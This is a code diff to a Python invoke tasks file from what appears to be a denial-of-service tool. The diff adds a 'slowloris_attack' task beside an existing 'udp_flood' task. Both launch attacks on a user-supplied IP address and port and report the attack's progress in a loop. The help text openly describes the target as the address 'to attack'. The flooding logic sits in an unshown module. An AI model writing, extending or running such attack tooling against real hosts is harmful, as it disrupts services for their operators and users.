@@ -2,7 +2,7 @@ from time import sleep
 
 from invoke import task
 from threading import Thread
-from core import UDPFlooder, UDPChecker, TCPChecker, Address, AddressWithPortValidator
+from core import UDPFlooder, UDPChecker, TCPChecker, Address, AddressWithPortValidator, SlowLoris
 
 
 @task(help={'address': "Please pass IP address with port to attack. i.e. 123.12.12.123:53"})
@@ -13,6 +13,16 @@ def udp_flood(c, address):
     while True:
         sleep(5)
         flooder.print_rate()
+
+
+@task(help={'address': "Please pass IP address with port to attack. i.e. 123.12.12.123:53"})
+def slowloris_attack(c, address):
+    slowloris = SlowLoris(address)
+    slowloris_thread = Thread(target=slowloris.run, daemon=True)
+    slowloris_thread.start()
+    while True:
+        sleep(5)
+        slowloris.print_opened_sockets_number()
 
 
 @task(help={'address': "Please pass IP address or domain address with port. i.e. 123.12.12.123:53 or domain.com:443"})
